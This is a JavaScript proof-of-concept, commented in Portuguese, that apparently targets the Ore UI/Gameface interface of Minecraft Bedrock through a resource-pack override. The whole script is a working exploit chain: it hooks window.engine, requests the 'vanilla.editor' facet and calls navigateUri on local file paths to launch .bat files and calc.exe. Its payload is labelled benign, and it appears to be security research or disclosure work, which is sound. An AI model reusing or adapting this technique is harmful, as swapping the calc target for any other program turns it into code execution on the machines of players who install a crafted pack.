/* ---------------------------------------------------------------
   Ore UI resource-pack override PoC  (payload benigno)
   Roda dentro do contexto Ore UI/Gameface, com acesso a window.engine
   --------------------------------------------------------------- */
(function () {
  'use strict';

  var IS_EDITOR = !!window.__ZIPE_EDITOR__;

  /* URIs tentadas em ordem. */
  var TARGETS = [
    'file:///C:/Users/Public/poc.bat',
    'file:///C:/Users/nfo/Desktop/bedrock-poc/poc.bat',
    'file:///C:/Users/nfo/Desktop/bedrock-poc/calc.bat',
    'file:///C:/Windows/System32/calc.exe'
  ];

  var launched = false;
  var requesting = false;

  function banner(text) {
    try {
      var el = document.getElementById('zipe-poc-banner');
      if (!el) {
        el = document.createElement('div');
        el.id = 'zipe-poc-banner';
        el.style.cssText = 'position:fixed;left:0;right:0;bottom:0;z-index:2147483647;' +
          'background:#a00;color:#fff;font:14px monospace;padding:6px 10px;' +
          'pointer-events:none;white-space:pre-wrap';
        (document.body || document.documentElement).appendChild(el);
      }
      el.textContent = 'ZIPE-POC > ' + text;
    } catch (e) {}
  }

  function launch(facet) {
    if (launched) return;
    launched = true;

    var i = 0;
    (function next() {
      if (i >= TARGETS.length) return;
      var uri = TARGETS[i++];
      try {
        facet.navigateUri(uri);
        banner('navigateUri OK -> ' + uri);
      } catch (err) {
        banner('navigateUri FALHOU em ' + uri + ' (' + err + ')');
      }
      setTimeout(next, 2000);
    })();
  }

  function arm() {
    var e = window.engine;
    if (!e || typeof e.on !== 'function' || typeof e.trigger !== 'function') return false;
    if (requesting) return true;

    /* erro do facet: mostra na faixa (ex.: activate-facet-not-found) */
    e.on('facet:error:vanilla.editor', function (err) {
      banner('facet error: ' + err);
    });

    e.on('facet:updated:vanilla.editor', function (facet) {
      var keys = '?';
      try { keys = facet ? Object.keys(facet).join(',') : 'null'; } catch (err) {}
      banner('facet vanilla.editor recebido [' + keys + ']');
      if (facet && typeof facet.navigateUri === 'function') {
        launch(facet);
      } else {
        banner('facet veio sem navigateUri');
      }
    });

    try {
      /* mesma chamada que a Ore UI faz em useSharedFacet() */
      e.trigger('facet:request', 'vanilla.editor', 'vanilla.editor', {});
      requesting = true;
      banner('JS do pack no Ore UI; pedindo facet vanilla.editor...');
    } catch (err) {
      banner('facet:request falhou: ' + err);
    }
    return true;
  }

  banner('Ore UI ativo: window.engine = ' + (window.engine ? 'ok' : 'ausente') + (IS_EDITOR ? ' [Editor]' : ' [Menu/Play]'));

  var tries = 0;
  var timer = setInterval(function () {
    tries++;
    if (arm() || tries > 300) clearInterval(timer);
  }, 100);
})();
